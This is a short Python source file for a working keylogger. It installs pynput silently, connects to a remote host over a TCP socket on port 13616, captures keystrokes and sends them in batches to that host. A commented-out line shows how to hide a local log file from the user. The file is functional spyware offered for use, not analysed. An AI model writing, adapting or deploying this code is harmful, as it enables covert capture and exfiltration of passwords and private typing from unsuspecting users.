# installs pynput
from subprocess import check_output
check_output("pip3 install pynput")
import socket
import pynput
from pynput.keyboard import Key, Listener


# keeping this in case I want to store locally and send keystrokes less frequently
# from subprocess import check_output
# hide log from user in file explorer
# check_output("attrib +s +h \"log.txt\"", shell=True)

# add your hostname
host = ''
ip = socket.gethostbyname(host)
port = 13616
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

count = 0
keys = []
space = False


def on_press(key):
    global keys, count, space

    # check if backspace is pressed
    if key != Key.backspace:
        keys.append(key)
        count += 1
    else:
        # POTENTIAL PROBLEM: backspace held down could mess up counter and remove keys in the buffer
        # remove the unintended key
        keys.pop()
        count -= 2

    # log every 10 key presses AFTER a space is pressed (keeps logs readable)
    if count >= 10 and key == Key.space:
        count = 0
        send_keys(keys)
        keys = []


def send_keys(logged_keys):
    temp = ""
    for key in logged_keys:
        if key == Key.space:
            # newline if space
            temp += "\n"
        elif str(key).find("Key") != -1:
            # if other key press (alt, tab, etc.) add newlines around it
            temp += "\n" + str(key) + "\n"
        elif key == Key.shift:
            # catch for things we don't want to log
            pass
        else:
            # add normal characters
            key = str(key)
            temp += key[1]
    s.send(temp.encode())


def on_release(key):
    # stop listener (only for testing)
    if key == pynput.keyboard.Key.esc:
        pass
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
